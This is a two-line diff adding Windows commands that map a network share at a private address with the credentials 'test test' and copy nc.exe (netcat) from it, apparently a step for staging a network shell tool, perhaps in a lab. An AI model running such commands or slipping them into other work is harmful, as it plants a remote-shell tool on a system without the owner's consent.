@@ -1,0 +1,2 @@
+net use n: \\192.168.220.133\share /user:test test
+copy n:\nc.exe
